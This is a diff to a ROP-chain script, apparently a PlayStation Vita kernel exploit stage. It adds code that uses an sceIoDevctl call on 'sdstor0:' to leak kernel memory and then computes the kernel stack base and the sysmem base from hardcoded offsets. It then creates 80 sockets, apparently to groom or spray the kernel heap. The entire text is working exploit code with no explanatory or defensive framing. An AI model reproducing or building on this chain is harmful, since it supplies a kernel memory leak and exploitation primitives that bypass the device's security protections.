@@ -1,9 +1,67 @@
+#include "common.rop"
+
 data
 {
 	#include "functions.rop"
+
+	buffer ioctl[0x400];
+	buffer crap[0x100];
+	variable file_uid = -1;
+	variable kernel_stack_base = -1;
+	variable sysmem_base;
+
+	symbol need_sockets = 80;
+	buffer sockets[need_sockets*4];
+}
+
+code : create_sockets(&socket, 0)
+{
+	return 0;
+}
+
+code : create_sockets(&addr, &n)
+{
+	socket("", 2, 1, 0);
+	store(&return, [addr]);
+	add([addr], 4);
+	store(&return, addr);
+	
+	PRINTF("socket %i\n", [n]);
+	
+	add([n], -1);
+	create_sockets([addr], &return);
+	return 0;
 }
 
 code : entry
 {
+	PRINTF("started\n");
+	strcat(crap, "xmc-lp-ign-userext");
+	strcat(crap+0x20, "sdstor0:");
+	memset(ioctl, 0, 0x400);
+	// sceKernelCreateThread("iwantsysmem", infinite_loop, 0, 0,0,0,0);
+	sceIoOpen("molecule0:", 0, 0);
+	sceIoDevctl(crap+0x20, 5, crap, 0x14, ioctl, 0x3FF);
+	PRINTF("%x\n", &return);
+
+#if 0
+	sceIoOpen("host0:stack.bin", 0x602, 6);
+	store(&return, file_uid);
+	PRINTF("%x\n", [file_uid]);
+	sceIoWrite([file_uid], ioctl, 0x400);
+	sceIoClose([file_uid]);
+#endif
+
+	add([ioctl+0x3C4], -0xABC);
+	store(&return, kernel_stack_base);
+	add([ioctl+0x3D4], -0x5747);
+	store(&return, sysmem_base);
+	PRINTF("kernel stack: 0x%x (?)\n", [kernel_stack_base]);
+	PRINTF("sysmem base: 0x%x \n", [sysmem_base]);
+
+	// create a lot of sockets
+	create_sockets(sockets, need_sockets);
+
+
 	infloop();
 }
